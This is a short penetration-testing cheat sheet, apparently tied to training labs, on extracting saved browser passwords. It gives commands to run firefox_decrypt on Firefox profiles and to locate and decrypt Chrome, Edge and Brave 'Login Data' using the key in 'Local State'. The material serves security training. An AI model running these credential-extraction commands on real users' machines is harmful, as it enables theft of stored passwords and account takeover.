# Browser Saved Passwords

<div class="row row-cols-lg-2"><div>

#### Extract Firefox Saved Passwords

[![password_attacks](../../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![file_insecure_storage_1](../../../_badges/rootme/cryptanalysis/file_insecure_storage_1.svg)](https://www.root-me.org/en/Challenges/Cryptanalysis/File-Insecure-storage-1)

Mozilla Firefox passwords can be extracted and cracked using [firefox_decrypt](https://github.com/unode/firefox_decrypt) <small>(1.7k ⭐)</small>. To install it on Kali:

```ps
$ cd /opt
$ git clone https://github.com/unode/firefox_decrypt.git
$ cd firefox_decrypt
$ python3.9 firefox_decrypt.py -h
$ python3.9 firefox_decrypt.py /tmp/.mozilla/firefox/
```

Additional notes:

```ps
$ ls -l .mozilla/firefox/ | grep default
$ cat .mozilla/firefox/xxx.default-release/logins.json | jq.
```
</div><div>

#### Extract Chrome, Edge, and Brave Saved Passwords

[![chrome](../../../_badges/thm-p/chrome.svg)](https://tryhackme.com/room/chrome)

*👻 To-do: you can use mimikatz for all of this...*

On Windows, you can find the user sensitive files at:

```text!
AppData\Local\Microsoft\Edge\User Data
AppData\Local\Google\Chrome\User Data
AppData\Local\BraveSoftware\Brave-Browser\User Data\
```

The [SQLite](/programming-languages/databases/relational/dbms/sqlite.md) database with user passwords is stored at `./<profile>/Login Data`. The default profile is called `Default`.

Passwords are encrypted using a base64 encoded secret key in:

```ps
$ cat "./Local State" | jq | grep "encrypted_key"
"encrypted_key": "<secret key here>"
```

You can use [dcp](https://github.com/palmenas/dcp/tree/main) <small>(0.02k ⭐)</small>, a Linux port of [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords/) <small>(0.7k ⭐)</small>, to decrypt passwords using the secret key:

```ps
$ python3 dcp.py -S secret_key -P "./Default/Login Data"
```
</div></div>